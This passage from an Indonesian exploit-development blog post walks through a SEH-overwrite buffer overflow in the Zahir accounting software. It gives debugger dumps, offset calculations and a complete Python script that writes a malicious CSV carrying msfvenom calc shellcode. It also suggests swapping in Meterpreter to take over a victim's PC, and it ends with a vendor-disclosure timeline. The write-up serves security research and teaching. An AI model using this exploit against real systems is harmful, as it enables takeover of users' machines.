0003253c  4b 6d 0a 77 00 26 03 00-30 ec 12 00 1c 26 03 00  Km.w.&amp;..0....&amp;..
0003254c  d4 25 03 00 44 44 44 44-30 ec 12 00 00 26 03 00  .%..DDDD0....&amp;..
0003255c  30 ec 12 00 17 fa 07 77-00 26 03 00 30 ec 12 00  0......w.&amp;..0...
0003256c  1c 26 03 00 d4 25 03 00-44 44 44 44 00 00 00 00  .&amp;...%..DDDD....
0003257c  00 26 03 00 00 00 00 00-00 00 00 00 00 00 00 00  .&amp;..............
0003258c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0003259c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</pre>
<p>Pada proses dump terhadap exception handler dengan melihat langsung pada tiap handler, dapat kita lihat di atas bagian berwarna merah menunjukkan alamat handler berikutnya. Kita bisa lihat bahwa handler terus mencoba mengatasi exception hingga pada akhirnya program mengalami crash. Dengan menjalankan perintah !exchain, terlihat bahwa exception chain berhenti pada alamat 0012ec30.</p>
<p><a href="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/exception.png"><img class="alignnone wp-image-123" src="https://i2.wp.com/blog.spentera.id/wp-content/uploads/2018/10/exception.png?resize=600%2C63" alt="" width="600" height="63" data-recalc-dims="1" /></a><br />
Jika kita melakukan dump pada alamat tersebut (0012ec30):</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">0:000&gt; d 0012ec30
0012ec30 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD
0012ec40 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD
0012ec50 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD
0012ec60 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD
0012ec70 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD
0012ec80 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD
0012ec90 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD
0012eca0 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD</pre>
<p>Dengan melihat tampilan di atas, hal tersebut membuktikan bahwa kita berhasil mengisi stack dengan buffer (junk) yang telah disiapkan (junk.csv). Berdasarkan informasi tersebut dapat kita simpulkan bahwa:</p>
<ul>
<li>Terkonfirmasi bahwa program Zahir memiliki kerentanan yang dapat di eksploitasi, yaitu melalui kerentanan CR LF.</li>
<li>Dengan kerentanan CR LF ini, kita bisa mengambil alih aliran eksekusi program Zahir.</li>
<li>Berdasarkan hasil <em>crash dump</em> bahwa telah terjadi exception, maka proses eksploitasi ini akan menggunakan tehnik untuk bypass SEH.</li>
</ul>
<p>Mengingat terdapat exception handler yang mengendalikan kondisi program apabila terjadi kesalahan, maka proses eksploitasi menjadi sedikit berbeda dari proses eksploitasi biasa dengan tehnik <em>direct RET</em>. Untuk membaca mengenai proses eksploitasi direct RET bisa membaca dokumen yang pernah saya tulis sebelumnya dengan judul <a href="https://www.scribd.com/doc/50645626/Exploit-Development-Basic-Stack-based-Overflow" target="_blank" rel="noopener">Exploit Development: Basic Stack-based Overflow</a>. Informasi mengenai proses eksploitasi SEH juga bisa dibaca dengan detail pada postingan di blog Spentera dengan judul <a href="https://blog.spentera.com/2011/09/14/seh-based-stack-overflow-the-basic/" target="_blank" rel="noopener">SEH Based Stack Overflow &#8211; The Basic</a>.</p>
<h2>Eksploitasi dengan Tehnik SEH</h2>
<p>Pada proses eksploitasi dengan tehnik SEH, kita akan menimpa alamat exception handler (SEH) dan alamat penunjuk exception handler selanjutnya (Next SEH). Bisa kita lihat dari diagram berikut (ide gambar dari Peter Van Eeckhoutte (Corelan)).</p>
<p><a href="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/seh-handler1-1.png"><img class="alignnone size-full wp-image-2303" src="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/seh-handler1-1.png?resize=600%2C165" alt="" width="600" height="165" srcset="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/seh-handler1-1.png?w=865&amp;ssl=1 865w, https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/seh-handler1-1.png?resize=300%2C83&amp;ssl=1 300w, https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/seh-handler1-1.png?resize=768%2C211&amp;ssl=1 768w" sizes="(max-width: 600px) 100vw, 600px" data-recalc-dims="1" /></a></p>
<p>Pada proses eksploitasi kali ini, perlu agak <em>tricky </em>menentukan di mana kita mencari alamat ketika junk buffer (A) menimpa SEH dan Next SEH. Untuk itu seperti biasa kita akan menggunakan bantuan skrip <em>pattern_create.rb</em> dari Metasploit<em> </em>dan memodifikasi skrip eksploitnya.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python

bag1= "hasil metasploit pattern_create"
pisah = '\r\n'
bag2 = "sebagian dari hasil metasploit pattern_create"

print "[+] Preparing for file..."
filename = "metasjunk.csv"
f = open(filename, 'w')
print "[+] Writing crafted malicious CSV file.."
f.write(bag1+pisah+bag2)
f.close()
print "[+] File %s written successfully.. bring it to Mr. Zahir." %filename</pre>
<p>Pada percobaan pertama, saya menghasilkan 3000 karakter acak dengan pattern_create.rb dan memecahnya menjadi 2 bagian.</p>
<ul>
<li>Bag1 saya isi dengan 2500 karakter acak</li>
<li>Bag2 saya isi dengan 500 karakter acak sisanya</li>
</ul>
<p>Hasil skrip tersebut kita impor lagi ke Zahir dan kita analisa hasilnya.</p>
<p><a href="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/2018-02-01_21-00-52.png"><img class="alignnone size-full wp-image-2304" src="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/2018-02-01_21-00-52.png?resize=600%2C106" alt="" width="600" height="106" srcset="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/2018-02-01_21-00-52.png?w=977&amp;ssl=1 977w, https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/2018-02-01_21-00-52.png?resize=300%2C53&amp;ssl=1 300w, https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/2018-02-01_21-00-52.png?resize=768%2C136&amp;ssl=1 768w" sizes="(max-width: 600px) 100vw, 600px" data-recalc-dims="1" /></a></p>
<p>Terlihat bahwa alamat 0012ec30 tertimpa dengan angka 73443173 yang merupakan karakter acak hasil dari pattern_create.rb. Untuk mengetahui offset atau posisi bytes ketika SEH tertimpa dengan buffer yang kita pilih, kita bisa menggunakan pattern_offset.rb.</p>
<p><a href="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/pattern_offset.png"><img class="alignnone size-full wp-image-2305" src="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/pattern_offset.png?resize=600%2C82" alt="" width="600" height="82" srcset="https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/pattern_offset.png?w=907&amp;ssl=1 907w, https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/pattern_offset.png?resize=300%2C41&amp;ssl=1 300w, https://i1.wp.com/blog.spentera.id/wp-content/uploads/2018/10/pattern_offset.png?resize=768%2C105&amp;ssl=1 768w" sizes="(max-width: 600px) 100vw, 600px" data-recalc-dims="1" /></a></p>
<p>Ternyata posisi offset ketika SEH tertimpa adalah di byte 2884. Hal ini menjadi sangat menarik karena jika kita lihat di atas, kita membagi buffer menjadi bag1 (2500 bytes) dan bag2 (500 bytes), dan rupanya offset berada di bytes 2884. Artinya ada kelebihan 384 bytes pada buffer bag1 (2500 bytes) yang menimpa stack sehingga setelah itu bytes berikutnya akan menimpa SEH dan Next SEH (nSEH). Berdasarkan analisis ini, kita perlu mengubah skrip skeleton eksploit kita menjadi seperti ini:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python

bag1= "A" * 2500
pisah = '\r\n'
bag2 = "B" * 384
nseh = "CCCC"
seh = "DDDD"
tambahan = "E" * 500

print "[+] Preparing for file..."
filename = "seh-junk.csv"
f = open(filename, 'w')
print "[+] Writing crafted malicious CSV file.."
f.write(bag1+pisah+bag2)
f.close()
print "[+] File %s written successfully.. bring it to Mr. Zahir." %filename</pre>
<p>Dari skrip di atas kita coba menimpa SEH dan nSEH dengan karakter C dan D. Apabila kalkulasi kita benar, maka pada alamat Next SEH akan terisi dengan karakter C (0x43434343) dan pada SEH akan terisi karakter D (0x44444444). Kita buka lagi program Zahir dan lakukan hal yang sama seperti sebelumnya, load kembali file junk kali ini dengan nama seh-junk.csv.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">Loading unloaded module list
.....................................................
This dump file has an exception of interest stored in it.
The stored exception information can be accessed via .ecxr.
(740.8f0): Access violation - code c0000005 (first/second chance not available)
eax=00000020 ebx=77856d8d ecx=0003105c edx=77856c74 esi=00031100 edi=00000000
eip=7786283e esp=00030fe8 ebp=00031018 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
ntdll!_SEH_prolog4+0x1a:
7786283e 53 push ebx
0:000&gt; !exchain
0003156c: ntdll!ExecuteHandler2+3a (77856d8d)
00031aac: ntdll!ExecuteHandler2+3a (77856d8d)
00031fec: ntdll!ExecuteHandler2+3a (77856d8d)
.............
0012e52c: ntdll!ExecuteHandler2+3a (77856d8d)
0012ea94: *** WARNING: Unable to verify checksum for Zahir.bpl
*** ERROR: Symbol file could not be found. Defaulted to export symbols for Zahir.bpl - 
Zahir!LbcsvTLbCsvGetRecord$qqrpc11DbTGetModeo+1df (025f48db)
0012ec30: 43434343
Invalid exception stack at 42424242
0:000&gt; d 0012ec30
0012ec30 42 42 42 42 43 43 43 43-44 44 44 44 45 45 45 45 BBBBCCCCDDDDEEEE
0012ec40 45 45 45 45 45 45 45 45-45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE
0012ec50 45 45 45 45 45 45 45 45-45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE
0012ec60 45 45 45 45 45 45 45 45-45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE
0012ec70 45 45 45 45 45 45 45 45-45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE
0012ec80 45 45 45 45 45 45 45 45-45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE
0012ec90 45 45 45 45 45 45 45 45-45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE
0012eca0 45 45 45 45 45 45 45 45-45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE</pre>
<p>Melihat hasil di atas, rupanya kita ada salah perhitungan sehingga posisi SEH yang seharusnya tertimpa dengan karakter D (0x44444444) malah tertimpa dengan karakter C (0x43434343). sedangkan Next SEH yang seharusnya tertimpa dengan karakter C (0x43434343) malah tertimpa dengan karakter B (0x42424242). Karakter E (0x45454545) sudah sangat sesuai dengan keinginan kita, sehingga tidak ada yang perlu kita rubah terkait hal tersebut. Posisi karakter E ini akan kita ganti dengan shellcode jika perhitungan kita sudah sesuai.<br />
Kesalahan perhitungan ini akan kita perbaiki segera dengan mengganti skrip menjadi berikut.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python

bag1= "A" * 2500
pisah = '\r\n'
bag2 = "B" * 380
nseh = "CCCC"
seh = "DDDD"
tambahan = "E" * 500

print "[+] Preparing for file..."
filename = "seh-junk.csv"
f = open(filename, 'w')
print "[+] Writing crafted malicious CSV file.."
f.write(bag1+pisah+bag2)
f.close()
print "[+] File %s written successfully.. bring it to Mr. Zahir." %filename</pre>
<p>Hasilnya:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">0012ea94: *** WARNING: Unable to verify checksum for Zahir.bpl
*** ERROR: Symbol file could not be found. Defaulted to export symbols for Zahir.bpl - 
Zahir!LbcsvTLbCsvGetRecord$qqrpc11DbTGetModeo+1df (029e48db)
0012ec30: 44444444
Invalid exception stack at 43434343</pre>
<p>Setelah hasil kalkulasi kita sesuai, saatnya kita mencari perintah berurut POP r32 POP r32 dan RET. Alamat ini dengan mudah dapat kita cari dengan bantuan tool mona.py yang sudah kita siapkan sebelumnya. Cara instalasi mona pada Windbg dapat dilihat pada dokumentasi Corelan <a href="https://github.com/corelan/windbglib">disini</a>. Untuk menjalankannya, kita hanya perlu menjalankan perintah berikut pada window Command:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">0:000&gt; .load pykd.pyd
0:000&gt; !py mona</pre>
<p>Jalankan perintah <strong>!py mona seh</strong> untuk mendapatkan hasilnya. Pada proses ini saya menemukan alamat 0x52016661 yang merupakan urutan perintah pop ecx # pop ebp # ret 0x04 diambil dari file vcl100.bpl. File ini merupakan file bawaan instalasi, sehingga apabila kita mengambil alamat POP r32 POP r32 RET dari file bawaan instalasi program, maka akan membuat proses eksploitasi ini menjadi <em>reliable</em> di versi Windows lainnya.<br />
Sebelum kita merubah alamat SEH menjadi 0x52016661, kita harus ingat bahwa setelah SEH tertimpa dengan alamat tersebut, maka aliran program akan langsung menuju Next SEH. Pada posisi Next SEH inilah, kita akan melempar aliran program ke tempat dimana bakal shellcode kita berada.</p>
<h2>Mengambil Alih Aliran Program</h2>
<p>Ketika SEH sudah terambil alih, maka aliran program berikutnya akan berlanjut ke Next SEH, karena Next SEH berisi alamat SEH berikutnya. Namun pada kasus ini, alamat SEH berikutnya sudah dapat kita kendalikan dan sudah terisi dengan karakter E (masih ingat?). Artinya, apabila kita mengisi Next SEH dengan perintah untuk membawa kita alamat berikutnya, kita dapat mengambil alih aliran program secara sempurna.<br />
Kita akan mengisi alamat Next SEH dengan lompatan kecil untuk &#8216;melewati&#8217; alamat SEH sebelumnya, sehingga proses selanjutnya akan langsung membawa kita ke karakter E. Proses eksploitasi ini adalah proses eksploitasi khas SEH yang umum. Namun karna pada kasus kali ini kita melakukan debug dari crash dump, kita tidak dapat memasang breakpoint pada alamat SEH.</p>
<p>Pada kenyataannya hal ini tidak akan merubah aliran eksploitasi dan kita akan melakukannya secara buta. Agar lebih jelas saya langsung memodifikasi skrip sebelumnya dan menambahkan shellcode, hasilnya dapat kita lihat pada skrip berikut.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python

bag1 = "A" * 2500
pisah = '\r\n'
bag2 = "B" * 380
nseh = "\xeb\x08\x90\x90"
seh = "\x61\x66\x01\x52"
nop = "\x90\x90\x90\x90"
# msfvenom -p windows/exec CMD=calc -f python -v shellcode
shellcode = ""
shellcode += "\xba\x15\x88\x74\x16\xdb\xd3\xd9\x74\x24\xf4\x58"
shellcode += "\x31\xc9\xb1\x30\x31\x50\x13\x83\xc0\x04\x03\x50"
shellcode += "\x1a\x6a\x81\xea\xcc\xe8\x6a\x13\x0c\x8d\xe3\xf6"
shellcode += "\x3d\x8d\x90\x73\x6d\x3d\xd2\xd6\x81\xb6\xb6\xc2"
shellcode += "\x12\xba\x1e\xe4\x93\x71\x79\xcb\x24\x29\xb9\x4a"
shellcode += "\xa6\x30\xee\xac\x97\xfa\xe3\xad\xd0\xe7\x0e\xff"
shellcode += "\x89\x6c\xbc\x10\xbe\x39\x7d\x9a\x8c\xac\x05\x7f"
shellcode += "\x44\xce\x24\x2e\xdf\x89\xe6\xd0\x0c\xa2\xae\xca"
shellcode += "\x51\x8f\x79\x60\xa1\x7b\x78\xa0\xf8\x84\xd7\x8d"
shellcode += "\x35\x77\x29\xc9\xf1\x68\x5c\x23\x02\x14\x67\xf0"
shellcode += "\x79\xc2\xe2\xe3\xd9\x81\x55\xc8\xd8\x46\x03\x9b"
shellcode += "\xd6\x23\x47\xc3\xfa\xb2\x84\x7f\x06\x3e\x2b\x50"
shellcode += "\x8f\x04\x08\x74\xd4\xdf\x31\x2d\xb0\x8e\x4e\x2d"
shellcode += "\x1b\x6e\xeb\x25\xb1\x7b\x86\x67\xdf\x7a\x14\x12"
shellcode += "\xad\x7d\x26\x1d\x81\x15\x17\x96\x4e\x61\xa8\x7d"
shellcode += "\x2b\x9d\xe2\xdc\x1d\x36\xab\xb4\x1c\x5b\x4c\x63"
shellcode += "\x62\x62\xcf\x86\x1a\x91\xcf\xe2\x1f\xdd\x57\x1e"
shellcode += "\x6d\x4e\x32\x20\xc2\x6f\x17\x43\x85\xe3\xfb\x84"

tambahan = "E" * 500

print "[+] Preparing for file..."
filename = "works.csv"
f = open(filename, 'w')
print "[+] Writing crafted malicious CSV file.."
f.write(bag1+pisah+bag2+nseh+seh+nop+shellcode+tambahan)
f.close()
print "[+] File %s written successfully.. bring it to Mr. Zahir." %filename</pre>
<p>Saya menambahkan sejumlah baris NOP agar ketika lompatan kecil pada Next SEH (\xeb\x08\x90\x90) mendarat pada NOP sebelum ke shellcode. Hal ini sering dilakukan oleh exploit developer agar proses jump ke shellcode dapat berjalan dengan baik. Hasilnya:</p>
<p><a href="https://i0.wp.com/blog.spentera.id/wp-content/uploads/2018/10/calc.png"><img class="alignnone size-full wp-image-2270" src="https://i0.wp.com/blog.spentera.id/wp-content/uploads/2018/10/calc.png?resize=598%2C531" alt="" width="598" height="531" srcset="https://i0.wp.com/blog.spentera.id/wp-content/uploads/2018/10/calc.png?w=598&amp;ssl=1 598w, https://i0.wp.com/blog.spentera.id/wp-content/uploads/2018/10/calc.png?resize=300%2C266&amp;ssl=1 300w" sizes="(max-width: 598px) 100vw, 598px" data-recalc-dims="1" /></a></p>
<p><strong>Owned!</strong><br />
Kita berhasil mengambil alih aliran program Zahir dan mengeluarkan kalkulator hanya dengan sebuah file works.csv.</p>
<h2>Extra Miles</h2>
<p>Pada skrip python di atas, saya menggunakan shellcode hasil dari msfvenom untuk mengeluarkan kalkulator. Sebagai bahan latihan:</p>
<ol>
<li>Gunakan shellcode meterpreter untuk mengambil alih PC korban</li>
<li>Temukan bad chars yang tersembunyi</li>
</ol>
<h2>Vulnerability Discovery Timeline</h2>
<div class="table-responsive">
<table style="width: 921px; height: 503px;" width="635">
<tbody>
<tr style="height: 74px;">
<td style="width: 181.6px; height: 74px;">1 September 2017</td>
<td style="width: 738.4px; height: 74px;">Menghubungi pihak Zahir melalui Pusat Dukungan. Tiket terbuat dengan nomor tiket #JTC-534-70652 (<a href="http://zahir.info/index.php?/Tickets/Ticket/View/JTC-534-70652">http://zahir.info/index.php?/Tickets/Ticket/View/JTC-534-70652</a>). Tiket ditugaskan ke bapak Ahdan Sadid.</td>
</tr>
<tr style="height: 26px;">
<td style="width: 181.6px; height: 26px;">12 September 2017</td>
<td style="width: 738.4px; height: 26px;">Meminta respon terhadap tiket yang belum ditindaklanjuti kepada bapak Ahdan Sadid</td>
</tr>
<tr style="height: 26px;">
<td style="width: 181.6px; height: 26px;">15 September 2017</td>
<td style="width: 738.4px; height: 26px;">Meminta respon terhadap tiket yang belum ditindaklanjuti kepada bapak Indra Septiady</td>
</tr>
<tr style="height: 50px;">
<td style="width: 181.6px; height: 50px;">18 September 2017</td>
<td style="width: 738.4px; height: 50px;">Pihak Zahir merespon atas nama bapak Indra Septiady yang akan menindaklanjuti informasi dari Spentera.</td>
</tr>
<tr style="height: 50px;">
<td style="width: 181.6px; height: 50px;">19 September 2017</td>
<td style="width: 738.4px; height: 50px;">Spentera memberikan skrip dan link video privat yang dapat digunakan sebagai pembuktian konsep temuan kerentanan.</td>
</tr>
<tr style="height: 98px;">
<td style="width: 181.6px; height: 98px;">28 September 2017</td>
<td style="width: 738.4px; height: 98px;">Tiket ditutup oleh pihak Zahir namun karena tidak ada tanggapan dari lebih lanjut, Spentera membuka kembali tiket dengan nomor #JTC-534-70652. Bersamaan dengan ini pula Spentera menanyakan hasil investigasi laporan yang sudah diberikan, serta jadwal perbaikan terhadap temuan tersebut.</td>
</tr>
<tr style="height: 74px;">
<td style="width: 181.6px; height: 74px;">24 Agustus 2018</td>
<td style="width: 738.4px; height: 74px;">Spentera membuka kembali tiket dengan nomor #ZYL-522-86966. Bersamaan dengan ini pula Spentera menanyakan hasil investigasi laporan yang sudah diberikan, serta jadwal perbaikan terhadap temuan tersebut.</td>
</tr>
<tr style="height: 74px;">
<td style="width: 181.6px; height: 74px;">11 September 2018</td>
<td style="width: 738.4px; height: 74px;">Tidak ada respon dari pihak Zahir, sehingga Spentera melaporkan temuan ini ke Pusat Operasi Keamanan Siber Nasional Badan Siber dan Sandi Negara dengan alamat email <a href="/cdn-cgi/l/email-protection#f48481879b84879f9599879d9a9587b49687879ada939bda9d90"><span class="__cf_email__" data-cfemail="0e7e7b7d617e7d656f637d67606f7d4e6c7d7d6020696120676a">[email&#160;protected]</span></a>.</td>
</tr>
<tr style="height: 31px;">
<td style="width: 181.6px; height: 31px;">23 September 2018</td>
<td style="width: 738.4px; height: 31px;">Request CVE to Mitre.</td>
</tr>
<tr>
<td style="width: 181.6px;">1 Oktober 2018</td>
<td style="width: 738.4px;">Publikasi di Exploit-DB (<a href="https://www.exploit-db.com/exploits/45505/">https://www.exploit-db.com/exploits/45505/</a>) dan blog Spentera</td>
</tr>
</tbody>
</table>
</div>

</div>
</section>
</article>
</div>
</main>
<aside class="read-next outer">
<div class="inner">
<div class="read-next-feed">
<article class="read-next-card">
<header class="read-next-card-header">
<h3><span>More in</span> <a href="/tag/exploit-development/">Exploit Development</a></h3>
</header>
<div class="read-next-card-content">
<ul>
<li>
<h4><a href="/unicode-stack-based-buffer-overflow-on-cyberlink-labelprint-2-5/">CyberLink LabelPrint: Buffer Overflow</a></h4>
<div class="read-next-card-meta">
<p><time datetime="2017-09-20">20 Sep 2017</time> –
6 min read</p>
</div>
</li>
<li>
<h4><a href="/allplayer-7-4-buffer-overflow-seh-unicode/">ALLPlayer: Buffer Overflow (SEH Unicode)</a></h4>
<div class="read-next-card-meta">
<p><time datetime="2017-08-18">18 Aug 2017</time> –
1 min read</p>
</div>
</li>
<li>
<h4><a href="/cyberlink-power2go-unicode-stack-overflow-2/">CyberLink Power2Go: Unicode Stack Overflow</a></h4>
 <div class="read-next-card-meta">
<p><time datetime="2012-04-15">15 Apr 2012</time> –
6 min read</p>
</div>
</li>
</ul>
</div>
<footer class="read-next-card-footer">
<a href="/tag/exploit-development/">See all 21 posts
→</a>
</footer>
</article>
<article class="post-card post tag-general ">
<a class="post-card-image-link" href="/windows-red-team-lab/">
<img class="post-card-image" srcset="/content/images/size/w300/2020/05/redteamlab.png 300w,
                    /content/images/size/w600/2020/05/redteamlab.png 600w,
                    /content/images/size/w1000/2020/05/redteamlab.png 1000w,
                    /content/images/size/w2000/2020/05/redteamlab.png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="/content/images/size/w600/2020/05/redteamlab.png" alt="Windows Red Team Lab Review" />
</a>
<div class="post-card-content">
<a class="post-card-content-link" href="/windows-red-team-lab/">
<header class="post-card-header">
<div class="post-card-primary-tag">General</div>
<h2 class="post-card-title">Windows Red Team Lab Review</h2>
</header>
<section class="post-card-excerpt">
<p>Students will be given remote desktop access to student machines that are connected to the Windows Active Directory with least privilege, and privilege escalation on student machine is part of challenge.</p>
</section>
</a>
<footer class="post-card-meta">
<ul class="author-list">
<li class="author-list-item">
<div class="author-name-tooltip">
Marie
</div>
<a href="/author/f3ci/" class="static-avatar">
<img class="author-profile-image" src="/content/images/size/w100/2020/05/photo_2017-10-15_07-31-16-2.jpg" alt="Marie" />
</a>
</li>
</ul>
<div class="post-card-byline-content">
<span><a href="/author/f3ci/">Marie</a></span>
<span class="post-card-byline-date"><time datetime="2018-10-02">2 Oct 2018</time> <span class="bull">&bull;</span> 3 min read</span>
</div>
</footer>
</div>
</article>
<article class="post-card post tag-security-advisory tag-web-security ">
<a class="post-card-image-link" href="/blind-sql-injection-vulnerability-in-filerun-2017-09-18/">
<img class="post-card-image" srcset="/content/images/size/w300/wordpress/2017/09/filerun-file-manager_770928_full.jpg 300w,
                    /content/images/size/w600/wordpress/2017/09/filerun-file-manager_770928_full.jpg 600w,
                    /content/images/size/w1000/wordpress/2017/09/filerun-file-manager_770928_full.jpg 1000w,
                    /content/images/size/w2000/wordpress/2017/09/filerun-file-manager_770928_full.jpg 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="/content/images/size/w600/wordpress/2017/09/filerun-file-manager_770928_full.jpg" alt="FileRun: Blind SQL Injection Vulnerability" />
</a>
<div class="post-card-content">
<a class="post-card-content-link" href="/blind-sql-injection-vulnerability-in-filerun-2017-09-18/">
<header class="post-card-header">
<div class="post-card-primary-tag">Security Advisory</div>
<h2 class="post-card-title">FileRun: Blind SQL Injection Vulnerability</h2>
</header>
<section class="post-card-excerpt">
 <p>We discovered a vulnerability during a pentest in a file sharing web application named FileRun. It allows us to access files anywhere through a self-hosted secure cloud storage, backup and</p>
</section>
</a>
<footer class="post-card-meta">
<ul class="author-list">
<li class="author-list-item">
<div class="author-name-tooltip">
Marie
</div>
<a href="/author/f3ci/" class="static-avatar">
<img class="author-profile-image" src="/content/images/size/w100/2020/05/photo_2017-10-15_07-31-16-2.jpg" alt="Marie" />
</a>
</li>
</ul>
<div class="post-card-byline-content">
<span><a href="/author/f3ci/">Marie</a></span>
<span class="post-card-byline-date"><time datetime="2017-09-29">29 Sep 2017</time> <span class="bull">&bull;</span> 5 min read</span>
</div>
</footer>
</div>
</article>
</div>
</div>
</aside>
<footer class="site-footer outer">
<div class="site-footer-content inner">
<section class="copyright"><a href="https://blog.spentera.id">Spentera Blog</a> &copy; 2021</section>
<nav class="site-footer-nav">
<a href="https://blog.spentera.id">Latest Posts</a>
<a href="https://www.facebook.com/spentera" target="_blank" rel="noopener">Facebook</a>
<a href="https://twitter.com/spentera" target="_blank" rel="noopener">Twitter</a>
<a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
</nav>
</div>
</footer>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
    </script>
<script src="/assets/built/casper.js?v=64d14f1267"></script>
<script>
        // Parse the URL parameter
        function getParameterByName(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        }

        // Give the parameter a variable name
        var action = getParameterByName('action');

        $(document).ready(function () {
            if (action == 'subscribe') {
                $('body').addClass("subscribe-success");
            }

            $('.subscribe-success-message .subscribe-close').click(function () {
                $('.subscribe-success-message').addClass('close');
            });

            // Reset form on opening subscrion overlay
            $('.subscribe-button').click(function() {
                $('.subscribe-overlay form').removeClass();
                $('.subscribe-email').val('');
            });
        });
    </script>
<script>
    $(document).ready(function () {
        // FitVids - start
        var $postContent = $(".post-full-content");
        $postContent.fitVids();
        // FitVids - end

        // Replace nav with title on scroll - start
        Casper.stickyNavTitle({
            navSelector: '.site-nav-main',
            titleSelector: '.post-full-title',
            activeClass: 'nav-post-title-active'
        });
        // Replace nav with title on scroll - end

        // Hover on avatar
        var hoverTimeout;
        $('.author-list-item').hover(function () {
            var $this = $(this);

            clearTimeout(hoverTimeout);

            $('.author-card').removeClass('hovered');
            $(this).children('.author-card').addClass('hovered');

        }, function () {
            var $this = $(this);

            hoverTimeout = setTimeout(function () {
                $this.children('.author-card').removeClass('hovered');
            }, 800);
        });
    });
</script>
</body>
</html>
